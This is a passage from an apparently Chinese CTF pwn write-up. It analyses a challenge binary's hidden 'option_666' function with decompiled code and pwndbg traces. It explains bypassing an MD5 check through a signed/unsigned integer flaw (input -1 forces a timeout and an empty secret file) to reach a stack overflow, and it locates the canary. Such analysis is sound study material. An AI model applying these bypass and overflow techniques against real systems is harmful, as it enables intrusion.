class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，有一个选项666，并没有在菜单中出现，我们进去看一下。后面我们可以知道，除了这个666选项有用，其他选项是没用的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">option_666</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> fda; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> encrypt_nums; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);                   <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input your name"</span>);               <span class="comment">// 输入不超过0x20字节的名字</span></span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x20</span>uLL);                      <span class="comment">// 这里超过0x19字节会覆盖canary</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to guess the secret?"</span>);</span><br><span class="line">  get_choose(&amp;result, <span class="number">2L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="string">'y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>) == <span class="number">-1</span> )       <span class="comment">// 如果/tmp/secret不存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, <span class="number">0777L</span>L);<span class="comment">// 创建/tmp/secret文件，flags:O_CREAT(0x40)|O_WRONLY(0x01),赋予777权限</span></span><br><span class="line">      fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);             <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">      read(fd, s, <span class="number">12u</span>LL);                       <span class="comment">// 从/dev/urandom读取12字节随机数</span></span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;                          <span class="comment">// /tmp/secret文件描述符值的低32位赋0</span></span><br><span class="line">      <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">11</span> )            <span class="comment">// 有符号v1与0xB，比较，小于0xB</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1] &amp;= <span class="number">1u</span>;                <span class="comment">// 使读出的随机数每个字节的高7位为0</span></span><br><span class="line">        LODWORD(v1) = v1 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, <span class="number">12u</span>LL);            <span class="comment">// 将读出的随机数经过处理写入/tmp/secret</span></span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1);            <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(v0, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input how many rounds do you want to encrypt the secret:"</span>);</span><br><span class="line">    encrypt_nums = get_option_num();            <span class="comment">// 输入对secret加密的次数</span></span><br><span class="line">    <span class="comment">// 只判断了大于 10 和为0 的情况</span></span><br><span class="line">    <span class="keyword">if</span> ( encrypt_nums &gt; <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"What? Why do you need to encrypt so many times?"</span>);<span class="comment">// 超过10次，退出</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !encrypt_nums )                        <span class="comment">// 加密次数为0，退出</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"At least encrypt one time"</span>, s);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>);   <span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    LODWORD(v2) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2 &lt; encrypt_nums )   <span class="comment">// 当加密次数输入为-1时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中</span></span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, <span class="number">16L</span>L, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    write(SHIDWORD(v2), s, <span class="number">16u</span>LL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try to guess the md5 of the secret"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s1, <span class="number">16u</span>LL);                        <span class="comment">// 输入你猜测的secret的MD5值</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;s1, s, <span class="number">16u</span>LL) )               <span class="comment">// 进行比较，相等则进入</span></span><br><span class="line">      cmp_md5_true((__int64)&amp;name);</span><br><span class="line">    <span class="comment">// 不相等，进行下列操作</span></span><br><span class="line">    v4 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>, <span class="number">0777L</span>L, v2);<span class="comment">// flags:O_TRUNC(0x200)|O_WRONLY(0x01)</span></span><br><span class="line">    fda = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);              <span class="comment">// flags:O_RDONLY(0x00)</span></span><br><span class="line">    read(fda, s, <span class="number">12u</span>LL);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">      s[i] &amp;= <span class="number">1u</span>;</span><br><span class="line">    write(v4, s, <span class="number">12u</span>LL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(fda);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Oh!bye %s\n"</span>, &amp;name);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们需要了解open()函数的flags的几个相关参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">头文件：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">函数原型：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line">函数参数：</span><br><span class="line">*pathname：要打开的文件的路径及名称</span><br><span class="line">flags:位掩码，用于指定文件的访问模式</span><br><span class="line">mode:当调用open()创建新文件时，指定了文件的访问权限，若flags未包含O_CREAT标志，则可以省略mode参数</span><br><span class="line"></span><br><span class="line">flags:</span><br><span class="line">文件访问标志：O_RDONLY、O_WRONLY、O_RDWR,这三者不能同时使用，只能指定其中一种</span><br><span class="line">             O_RDONLY:以只读权限打开</span><br><span class="line">             O_WRONLY:以只写权限打开</span><br><span class="line">             O_RDWR:以读写权限打开</span><br><span class="line">文件创建标志：这里面只说此题中用到的O_TRUNC。</span><br><span class="line">             O_TRUNC:如果文件已经存在且为普通文件，那么将文件内容清空，将其长度置<span class="number">0.</span></span><br><span class="line">已打开文件状态标志</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里由于IDA显示的是多个flags选项相或的值，我们可以通过constgrep命令查看每个flags选项的的值，并进行计算，确定所用的flags选项。</p><p>&emsp;&emsp;程序首先通过open()创建只写文件/tmp/secret，并赋予777权限。然后从/dev/urandom读出12个字节随机数，处理后存入/tmp/secret文件，并关闭文件。然后在执行MD5加密前，以flags:O_TRUNC(0x200)|O_WRONLY(0x01)调用open()函数，将/tmp/secret文件清空，对处理后的随机数执行MD5加密后，将MD5加密后的结果存入/tmp/secret文件。然后让我们猜加密后的MD5值，猜对了进入存在明显溢出漏洞的cmp_md5_true函数。</p><p>&emsp;&emsp;我们这里需要绕过MD5值对比的验证，进入漏洞函数进行利用。对随机数进行MD5加密的次数，是由用户控制的，由于程序只判断了加密次数大于10和等于0的情况，所以这里可以通过输入-1进行绕过。当我们输入-1时，在进行加密次数判断时，v2(无符号)与encrypt_num(有符号)比较时，-1会变成一个很大的数，致使程序一直处于加密循环中，造成程序运行超时退出，时间为一分钟。导致/tmp/secret文件为空，这是我们再开一个交互，就可以预测MD5的值了，由于文件为空，所以被加密的明文为”\x00”*16,我们通过hashlib算出”\x00”*16的MD5值，即可绕过验证。</p><p>下面是一些调试过程:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、创建完/tmp/secret后，文件描述符值</span><br><span class="line">   <span class="number">0x4011dc</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011e1</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>HIDWORD(v1) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x41</span>, 0777LL)<span class="comment">;</span></span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x4011e6</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x4011e9</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x4011ee</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019cd</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、看看程序对从/dev/unrandom读出的随机数做了什么</span><br><span class="line">   <span class="number">0x401216</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40121d</span>    <span class="keyword">jmp</span>    <span class="number">0x40123b</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> 00007fff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     b563b8cc0cfde998 00000000f9684b16</span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line">while ( v1 &lt;= <span class="number">11</span> )                        // 有符号v1与<span class="number">0xB</span>，比较，小于<span class="number">0xB</span>则执行while循环，处理随机数</span><br><span class="line">&#123;</span><br><span class="line">  s[v1] &amp;= 1u<span class="comment">;</span></span><br><span class="line">  LODWORD(v1) = v1 + <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">执行上一段代码前：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">98</span> e9 fd 0c cc b8 <span class="number">63</span> b5 <span class="number">16</span> 4b <span class="number">68</span> f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">执行上一段代码后：s[<span class="number">32</span>]</span><br><span class="line">pwndbg&gt; <span class="built_in">db</span> <span class="built_in">rbp</span>-<span class="number">0x60</span></span><br><span class="line">00007fffffffdca0     <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span>| <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">00007fffffffdcb0     f0 <span class="built_in">dd</span> ff ff ff 7f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">这段代码使读出的随机数每个字节的高<span class="number">7</span>位为<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、将处理后的随机数写入/tmp/secret</span><br><span class="line">   <span class="number">0x401245</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>]</span><br><span class="line">   <span class="number">0x401248</span>    <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="number">0xc</span></span><br><span class="line">   <span class="number">0x40124d</span>    <span class="keyword">mov</span>    <span class="built_in">rsi</span>, <span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x401250</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"> ► <span class="number">0x401252</span>    <span class="keyword">call</span>   <span class="number">0x400b38</span>write(SHIDWORD(v1), s, 12uLL)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x3</span> /tmp/secret</span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span>  随机数</span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdca0</span> ◂— <span class="number">0x101000000010100</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、看看第二次打开/tmp/secret时的文件描述符的值</span><br><span class="line">   <span class="number">0x40126b</span>    <span class="keyword">mov</span>    <span class="built_in">esi</span>, <span class="number">0</span></span><br><span class="line">   <span class="number">0x401270</span>    <span class="keyword">mov</span>    <span class="built_in">edi</span>, <span class="number">0x4019c1</span></span><br><span class="line">   <span class="number">0x401275</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x40127a</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>v0 = open(<span class="string">"/tmp/secret"</span>, <span class="number">0</span>, v1)<span class="comment">;</span></span><br><span class="line">pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0xc</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7ffff76c08f0</span> (__close_nocancel+<span class="number">7</span>) ◂— <span class="keyword">cmp</span>    <span class="built_in">rax</span>, -<span class="number">0xfff</span></span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x7ffff7fd3700</span> ◂— <span class="number">0x7ffff7fd3700</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 和第一次打开的文件描述符一样？前一个文件描述符已经关闭了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、看看第三次打开/tmp/secret时的文件描述符的值</span><br><span class="line"> ► <span class="number">0x401303</span>    <span class="keyword">call</span>   <span class="number">0x400b40</span>HIDWORD(v2) = open(<span class="string">"/tmp/secret"</span>, <span class="number">0x201</span>)<span class="comment">; </span></span><br><span class="line"> pwndbg&gt; dumpargs --force</span><br><span class="line"> <span class="built_in">rdi</span> = <span class="number">0x4019c1</span> ◂— <span class="string">'/tmp/secret'</span></span><br><span class="line"> <span class="built_in">rsi</span> = <span class="number">0x201</span></span><br><span class="line"> <span class="built_in">rdx</span> = <span class="number">0x0</span></span><br><span class="line"> <span class="built_in">rcx</span> = <span class="number">0x7fffffffdc51</span> ◂— <span class="number">0xfa00000000000031</span> /* <span class="string">'1'</span> */</span><br><span class="line">  <span class="built_in">r8</span> = <span class="number">0x0</span></span><br><span class="line">  <span class="built_in">r9</span> = <span class="number">0x1999999999999999</span></span><br><span class="line">*<span class="built_in">RAX</span>  <span class="number">0x3</span> 依旧是<span class="number">3</span>，因为前面两次都关闭了文件描述符</span><br><span class="line">文件描述符的值始终是当前可用的最小的值，<span class="number">0x00</span>、<span class="number">0x01</span>、<span class="number">0x02</span>分别被stdin、stdout、stderr占据，所以之前没有打开的文件时，当前打开的文件的文件描述符为<span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、查看保存文件描述符的变量的值</span><br><span class="line">   <span class="number">0x401308</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x7c</span>], <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x40130b</span>    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>], <span class="number">0</span></span><br><span class="line"> ► <span class="number">0x401312</span>    <span class="keyword">jmp</span>    <span class="number">0x40132d</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dq</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>v2=<span class="number">0x0000000300000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">0000000300000000</span> ffffffff00000004</span><br><span class="line">00007fffffffdc90     <span class="number">0000000000000079</span> <span class="number">0000000000000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">0101000000010100</span> <span class="number">0000000001000100</span></span><br><span class="line">00007fffffffdcb0     00007fffffffddf0 <span class="number">0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、当加密次数输入为-<span class="number">1</span>时，一直处于加密循环中</span><br><span class="line">   <span class="number">0x40132d</span>    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x80</span>]   v2</span><br><span class="line">   <span class="number">0x401330</span>    <span class="keyword">cmp</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x74</span>]   encrypt_nums</span><br><span class="line"> ► <span class="number">0x401333</span>  ✔ <span class="keyword">jb</span>     <span class="number">0x401314</span>(unsigned <span class="keyword">int</span>)v2 &lt; encrypt_nums</span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x80</span>  v2=<span class="number">0x00000000</span></span><br><span class="line">00007fffffffdc80     <span class="number">00000000</span> <span class="number">00000003</span> <span class="number">00000004</span> ffffffff</span><br><span class="line">00007fffffffdc90     <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdca0     <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdcb0     ffffddf0 00007fff <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">pwndbg&gt; <span class="built_in">dd</span> <span class="built_in">rbp</span>-<span class="number">0x74</span>  encrypt_nums=<span class="number">0xffffffff</span></span><br><span class="line">00007fffffffdc8c     ffffffff <span class="number">00000079</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00007fffffffdc9c     <span class="number">00000000</span> <span class="number">00010100</span> <span class="number">01010000</span> <span class="number">01000100</span></span><br><span class="line">00007fffffffdcac     <span class="number">00000000</span> ffffddf0 00007fff <span class="number">00000000</span></span><br><span class="line">00007fffffffdcbc     <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> f75ffe90</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、canary</span><br><span class="line">option_666()</span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"> <span class="built_in">RSP</span>  <span class="number">0x7fffffffdc80</span> ◂— <span class="number">0x5000000</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">c:</span><span class="number">0060</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdce0</span> ◂— <span class="number">0x4141414141414141</span> (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">... ↓</span><br><span class="line">0f:<span class="number">0078</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span> &lt;&lt;canary</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"></span><br><span class="line">get_option_num()</span><br><span class="line">   <span class="number">0x400d47</span>    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line">   <span class="number">0x400d48</span>    <span class="keyword">mov</span>    <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x400d4b</span>    <span class="keyword">sub</span>    <span class="built_in">rsp</span>, <span class="number">0x20</span></span><br><span class="line">   <span class="number">0x400d4f</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0x28</span>]</span><br><span class="line"> ► <span class="number">0x400d58</span>    <span class="keyword">mov</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">8</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdc68</span> ◂— <span class="number">0xac2fcd3b25ae0f00</span>  &lt;&lt;canary</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span 